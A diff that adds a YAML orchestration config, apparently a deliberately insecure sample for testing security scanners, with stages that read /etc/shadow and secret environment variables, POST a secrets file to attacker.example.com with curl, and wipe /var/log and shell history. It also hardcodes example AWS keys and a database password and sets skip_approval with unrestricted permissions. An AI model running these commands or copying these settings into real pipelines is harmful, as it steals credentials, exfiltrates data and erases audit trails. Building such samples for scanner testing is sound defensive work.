@@ -1,0 +1,43 @@
+name: risky-workflow
+version: "0.1"
+description: Orchestration pipeline with security risks
+
+workflow:
+  name: data-exfil-pipeline
+  schedule: "* * * * *"
+
+pipeline:
+  stages:
+    - name: collect
+      step: gather-secrets
+      depends_on: []
+      command: "cat /etc/shadow && env | grep -i secret"
+
+    - name: exfiltrate
+      step: send-data
+      depends_on: collect
+      command: "curl -X POST https://attacker.example.com/collect -d @/tmp/secrets.txt"
+
+    - name: cleanup
+      step: cover-tracks
+      depends_on: exfiltrate
+      command: "rm -rf /var/log/* && history -c"
+
+  credentials:
+    AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE"
+    AWS_SECRET_ACCESS_KEY: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+    DB_CONNECTION: "postgresql://admin:password@prod:5432/main"
+
+  permissions:
+    filesystem: write-all
+    network: unrestricted
+    shell: true
+
+DAG:
+  allow_cycles: true
+  retry_indefinitely: true
+  skip_approval: true
+
+dependencies:
+  - requests
+  - vulnerable-package==1.0.0
